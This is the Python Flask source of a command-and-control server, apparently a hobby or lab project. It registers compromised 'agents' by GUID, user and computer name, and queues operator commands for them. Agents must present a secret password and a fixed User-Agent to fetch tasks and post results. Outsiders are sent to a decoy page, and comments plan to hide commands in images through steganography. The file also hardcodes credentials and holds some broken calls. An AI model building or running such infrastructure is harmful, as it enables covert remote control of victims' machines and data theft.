from sqlalchemy import desc, func
from sqlalchemy.sql.functions import user
from flask_sqlalchemy import SQLAlchemy
from flaskext.mysql import MySQL
from flask import Flask, render_template, request, url_for, redirect
import flask_login
import base64
import os

app = Flask(__name__)


if os.path.exists('database/c2.db'):
    pass
else:
    os.mknod("database/c2.db")

username = "pogChamp"
password = "BestC2Ever"
server = "10.0.2.15"

authToken = "areTheyDeadYet"
app.secret_key = 'My name is bobobo-bo bo-bobobo, but you can call me bobobo'

app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://{}:{}@{}/c2".format(
    username, password, server)
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['TEMPLATES_AUTO_RELOAD'] = True


login_manager = flask_login.LoginManager()
login_manager.init_app(app)


db = SQLAlchemy(app)

password = 'Bobobo'


def main():
    size_db = os.path.getsize("database/c2.db")


class CommandImages(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    image = db.Column(db.Text(4294000000))
    done = db.Column(db.Boolean)


class Command(db.Model):

    id = db.Column(db.Integer, primary_key=True)
    cmd = db.Column(db.String(4096))
    done = db.Column(db.Boolean)


class Results(db.Model):

    id = db.Column(db.Integer, primary_key=True)
    results = db.Column(db.String(4096))


class Users(db.Model):

    username = db.Column(db.String(64), primary_key=True)


# for flask login
class User(flask_login.UserMixin):
    pass


class Agents(db.Model):

    guid = db.Column(db.String(64), primary_key=True)
    user = db.Column(db.String(256))
    computer = db.Column(db.String(256))


def getUserList():
    users_unfiltered = Users.query.all()
    users = []
    for x in users_unfiltered:
        users.append(x.username)
    return users


def getGuidList():
    agents_unfiltered = Agents.query.all()
    agents = []
    for x in agents_unfiltered:
        agents.append(x.username)
    return agents


@login_manager.user_loader
def user_loader(username):
    users = getUserList()
    if not(username) or username not in str(users):
        return
    user = User()
    user.id = username
    return user


@login_manager.request_loader
def request_loader(request):
    users = getUserList()
    username = request.form.get('username')
    if not(username) or username not in str(users):
        return
    user = Users()
    user.id = username
    user.is_authenticated = True
    return user


@app.route('/home')
@flask_login.login_required
def home():
    get_commands = Command.query.all()
    if len(Results.query.all()) == 0:
        return render_template('index.html', returns=' \n ', commands=get_commands, name=flask_login.current_user.id)
    else:
        get_returns = Results.query.order_by(desc(Results.id))
        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
            return render_template('index.html',
                                   returns=get_returns[0].results,
                                   commands=get_commands, name=flask_login.current_user.id)
        else:
            return render_template('redir.html')


@app.route('/register', methods=['POST'])
def register():
    req_data = request.data.decode("utf-8")[4:]
    hex_data = bytes.fromhex(req_data)
    ascii_data = hex_data.decode("ASCII")
    parsed_data = ascii_data.split('&')
    print(parsed_data)
    if parsed_data[0] == "auth=507261697365204c6f7264204265726e617264696e6921":
        guid = parsed_data[1][5:]
        user = parsed_data[2][5:]
        computer = parsed_data[3][9:]
        if guid not in getGuidList:
            save_agent = Agents(guid=guid, user=user, computer=computer)
            db.session.add(save_agent)
            db.session.commit()
        return render_template('register.html')
    else:
        return render_template('redir.html')


# TODO CHANGE COMMANDS FUNCTION TO WORK WITH STEGANOGRAPHY
# NOTE WE WILL PROBABLY HAVE TO CHANGE THE SQL DATABASE WITH THIS, TOO


def getImages():
    images_raw = CommandImages.query.all()
    images = []
    for x in images_raw:
        images.append(x.image)
    return images


@app.route('/commands', methods=['GET', 'POST'])
def getCommand():
    print("---------------------SECRET KEY-------------------")
    secretKey = request.headers.get('Authorization')
    print("---------------------PASS = " + secretKey + "-------------------")
    # guid = request.args.get('guid')
    if secretKey == password:
        print("---------------------User-Agent-------------------")
        userAgent = request.headers.get('User-Agent')
        if userAgent == "Myles920":
            print("---------------------DATA REQUEST-------------------")
            result = request.data
            # result_data = base64.b64decode(result).decode('utf-8')

            # new_results = Results(results=result_data)
            # db.add(new_results)
            # TODO CHANGE THE 'DONE' STATUS OF THE COMMAND TO TRUE, SINCE WE RECEIVED THE RESPONSE

            # db.session.commit()
        task_queue = Command.query.all()
        # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST

        return render_template('commands.html', task_queue=task_queue)
    else:
        return render_template('redir.html')


@app.route('/create-task', methods=['POST'])
@flask_login.login_required
def create():
    new_task = Command(cmd=request.form['content'], done=False)
    db.session.add(new_task)
    db.session.commit()
    return redirect(url_for('home'))


@app.route('/delete/<id>')
def delete(id):
    Command.query.filter_by(id=int(id)).delete()
    db.session.commit()
    return redirect(url_for('home'))


@app.route('/')
def authenticate():
    auth = request.args.get('auth')
    # ensure that the user accessing the page should be here
    if auth != authToken:
        return render_template('redir.html')
    else:
        return render_template('login.html', auth=auth)


@app.route('/login', methods=['GET', 'POST'])
def login():
    # ensure that the user accessing the page should be here
    auth = request.form['authorization']
    if auth != authToken:
        print("[!] auth failed")
        return render_template('redir.html')

    # tru to get the necessary login info
    try:
        username = request.form['username']
        uPassword = request.form['password']
    except:
        print("[!] couldn't find all tokens")
        return render_template('redir.html')

    if uPassword == password:
        users = getUserList()
        print(users)
        if username not in users:
            new_user = Users(username=username)
            db.session.add(new_user)
            db.session.commit()

        user = User()
        user.id = username
        flask_login.login_user(user)
        # bring the user to the home page
        print("** before redirect to home")
        return redirect(url_for('home'))

    # information did not match
    print("****** before redir.html")
    return render_template('redir.html')


@app.route('/logout')
@flask_login.login_required
def logout():
    flask_login.logout_user()
    return render_template('login.html', auth=authToken)


@login_manager.unauthorized_handler
def unauthorized_handler():
    return render_template('unauth.html')


if __name__ == '__main__':
    main()
    app.run(host="0.0.0.0", debug=False)
    db.create_all()


# DEPRECATED CODE


# @app.route('/upload', methods=['GET'])
# def upload():
#     return render_template('img-commands.html')


# @app.route('/upload', methods=['GET', 'POST'])
# def upload_file():
#     # if request.method == 'GET':
#     #     return render_template('upload.html')
#     # elif request.method == 'POST':
#     imgFile = request.files['image']
#     new_img = CommandImages(image=imgFile, done=False)
#     db.add(new_img)
#     db.commit()
#     return render_template('img-commands.html', images=getImages())
